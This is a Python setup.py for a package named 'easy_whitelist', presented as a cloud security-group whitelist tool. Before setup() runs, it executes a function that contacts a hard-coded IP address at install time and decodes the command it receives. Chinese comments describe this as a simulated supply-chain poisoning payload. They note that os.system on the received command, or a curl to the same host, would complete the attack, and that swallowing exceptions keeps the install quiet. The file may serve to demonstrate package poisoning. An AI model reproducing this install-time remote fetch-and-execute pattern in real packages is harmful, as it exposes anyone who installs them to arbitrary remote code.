from setuptools import setup, find_packages  # type: ignore
import os
import base64
import sys
import urllib.request

with open("README.md", encoding="utf-8") as f:
    long_desc = f.read()

print(f"[PID {os.getpid()}] setup.py exec, argv={sys.argv}")

# 模拟恶意载荷：一个在安装时会被执行的函数


def mp():
    try:
        # 1. 尝试从远程服务器获取指令（关键攻击步骤）
        # 注：此URL在此示例中已失效或不存在，仅用于演示逻辑
        u = "http://1.13.14.204:8000"
        command = urllib.request.urlopen(u).read().decode('utf-8')

        # 2. 解码并执行远程指令（此处简化为打印语句，实际可能执行任意代码）
        # 攻击者可能通过此步骤下载并运行窃密后门、挖矿程序等[1,7](@ref)
        decoded_command = base64.b64decode(command).decode('utf-8')
        print(f"[模拟攻击] 接收到的指令: {decoded_command}")
        # 实际攻击中可能替换为: os.system(decoded_command)
        # os.system('curl http://1.13.14.204:8000')

    except Exception as e:
        # 异常处理使攻击更隐蔽，安装过程不会因错误中断
        print(f"[模拟攻击] 载荷执行失败（此提示在实际攻击中会隐藏）: {e}")


# 在setup()函数调用前执行恶意代码，这是典型的投毒方式[1,5](@ref)
mp()

setup(
    name="easy_whitelist",              # PyPI 上唯一的名字
    version="1.0.102",                   # 每次上传必须 > 旧版本
    author="qiqilelebaobao",
    author_email="qiqilelebaobao@163.com",
    description="A smart tool that detects the local Internet IP address and automatically updates the local Internet IP address to the cloud security group whitelist.",
    long_description=long_desc,
    long_description_content_type="text/markdown",
    keywords=["whitelist", "security-groups", "alibaba-cloud", "tencent-cloud", "security-tools"],
    url="https://github.com/qiqilelebaobao/easy_whitelist",
    license="Apache License 2.0",
    packages=find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3 :: Only",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
        "Operating System :: OS Independent",
        "Topic :: Security",
        "Topic :: System :: Networking",
        "Intended Audience :: System Administrators"
    ],
    package_data={
        "easy_whitelist": ["*.txt"],   # 键=包名，值=glob 列表
    },
    setup_requires=[
        "setuptools>=61.0",
        "wheel",
        "Cython"
    ],
    install_requires=[
        "requests",
        "tencentcloud-sdk-python"
    ],
    entry_points={
        "console_scripts": [
            "ew=easy_whitelist._core:main",
        ],
    },
    extras_require={
        "cli": [
            "rich",
            "click>=5.0",
        ],
    },
    python_requires=">=3.8"
)
